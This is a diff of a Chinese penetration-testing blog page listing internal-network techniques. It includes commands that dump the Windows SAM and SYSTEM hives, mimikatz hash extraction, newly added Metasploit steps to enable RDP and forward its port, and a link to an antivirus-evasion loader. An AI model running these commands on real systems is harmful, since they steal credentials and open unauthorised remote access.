@@ -24,7 +24,7 @@
 <meta property="og:description" content="前言 随着在大型比赛中内网越来越重要，打内网的机会越来越多，在此记录一些常用的内网渗透技巧&#x2F;命令&#x2F;工具,省的每次用都要去搜，机会是留给有准备的人的，你准备的越充分，机会到来的时候，你就越不会慌张。 正文 在Windows环境中抓密码 工具  搞安全谁不知道这个工具mimikatz 微软官方的工具，带数字签名，有一定的免杀效果但不多procdump SqlDumper，默认存放在C:FilesSQL">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2023-01-18T03:05:52.000Z">
-<meta property="article:modified_time" content="2023-05-05T01:37:22.465Z">
+<meta property="article:modified_time" content="2023-07-10T09:59:18.150Z">
 <meta property="article:author" content="ccadmin">
 <meta property="article:tag" content="内网渗透">
 <meta property="article:tag" content="渗透测试">
@@ -222,7 +222,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.8k 字
+          1.9k 字
         
       </span>
     
@@ -233,7 +233,7 @@
         
         
         
-          15 分钟
+          16 分钟
         
       </span>
     
@@ -302,6 +302,8 @@ target="_blank" rel="noopener" href="https://gist.github.com/xpn/c7f6d15bf15750e
 <p>配合sam和system文件,文件位置C:，默认情况下由于文件占用无法复制出来，可以使用以下命令保存。火绒居然不拦截，果然装火绒就是图一乐。</p>
 <figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nsis">reg save <span class="hljs-params">HKLM</span>\<span class="hljs-params">SYSTEM</span> <span class="hljs-params">System</span>Bkup.hiv<br>reg save <span class="hljs-params">HKLM</span>\SAM SamBkup.hiv<br></code></pre></td></tr></table></figure>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">mimikatz.exe <span class="hljs-string">&quot;lsadump::sam /system:sys.hiv /sam:sam.hiv&quot;</span> <span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure>
+<h3 id="msf开启rdp和端口转发">msf开启rdp和端口转发</h3>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">run</span> post/windows/manage/enable_rdp<br> portfwd <span class="hljs-built_in">add</span> -l 13389 -r 192.168.1.9 -p 3389<br></code></pre></td></tr></table></figure>
 <h3 id="通用免杀">通用免杀</h3>
 <p>链接：<a
 target="_blank" rel="noopener" href="https://github.com/TheD1rkMtr/FilelessPELoader">https://github.com/TheD1rkMtr/FilelessPELoader</a></p>
